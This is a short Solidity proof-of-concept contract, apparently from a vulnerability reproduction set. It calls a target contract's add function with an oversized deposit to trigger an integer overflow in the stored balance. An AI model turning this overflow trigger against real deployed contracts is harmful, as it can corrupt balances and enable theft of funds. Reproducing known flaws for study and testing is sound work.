
interface IOverflow_Add {
    function add(uint256 deposit) external;
    function balance() external view returns (uint);
}

contract Reproduction {
    IOverflow_Add public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = IOverflow_Add(_vulnerableContract);
    }

    function setup() public {
        // Setup vulnerable contract state before triggering the overflow
        uint256 initialDeposit = 1;
        vulnerableContract.add(initialDeposit);
    }

    function triggerOverflow(uint256 deposit) public {
        // Trigger the overflow by adding a large value that exceeds uint256 limits
        vulnerableContract.add(deposit);
    }

    function getBalance() public view returns (uint) {
        return vulnerableContract.balance();
    }
}